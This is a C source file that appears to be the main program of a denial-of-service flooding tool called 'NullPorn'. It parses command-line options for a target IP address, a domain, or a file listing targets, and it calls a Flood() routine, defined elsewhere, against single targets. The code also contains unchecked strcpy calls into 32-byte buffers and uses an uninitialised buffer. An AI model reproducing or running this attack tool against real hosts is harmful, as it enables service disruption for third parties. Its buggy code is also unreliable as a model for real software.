#include "FileUtils.h"
#include "DDoS.h"

#include <string.h>
#include <stdlib.h>
#include <getopt.h>

int main(int argc, char* argv[])
{
    FileType fileType = FileType_None;
    bool fileRead = false;

    char filepath[32];
    char* fileBuffer;

    int option = 0;
    while ((option = getopt(argc, argv, "d:D:i:I:")) != -1)
    {
        switch(option)
        {
        case 'i': {
                char ip[32];
                strcpy(ip, optarg);
                Flood(ip);
                return 0;
            } break;

        case 'd': {
                char domain[32];
                strcpy(domain, optarg);
                char* ip = DNSLookup(domain); 
                Flood(ip);
                free(ip);
                return 0;
            } break;

        case 'D': {
                strcpy(filepath, optarg);
                fileBuffer = OpenFile(filepath);

                fileRead = fileBuffer != NULL;
                fileType = FileType_Domains;
            } break;

        case 'I': {
                strcpy(filepath, optarg);
                fileBuffer = OpenFile(filepath);

                fileRead = fileBuffer != NULL;
                fileType = FileType_IpAddresses;
            } break;
                         
        default: {
                fprintf(stderr, "[USAGE]: \"sudo ./NullPorn -[iIdD] [arguments]\".\n");
                return -1;
             } break;
        }
    }
   
    size_t numberLines = 0;
    for (uint32_t i = 0; i < strlen(fileBuffer); i++)
        if (fileBuffer[i] == '\n')
            numberLines++;
    char** lines = (char**) malloc(sizeof(char*) * numberLines);
    for (uint32_t i = 0; i < numberLines; i++)
        lines[i] = (char*) malloc(32);

    char* token = strtok(fileBuffer, "\n");
    size_t index = 0;
    while (token != NULL)
    {
        strcpy(lines[index], token);
        token = strtok(NULL, "\n");
        index++;
    }

    for (uint32_t i = 0; i < numberLines; i++)
        printf("%d: %s\n", i, lines[i]);

    if (fileRead)
    {
        for (uint32_t i = 0; i < numberLines; i++)
            free(lines[i]);

        free(lines);
        free(fileBuffer);
    }
}
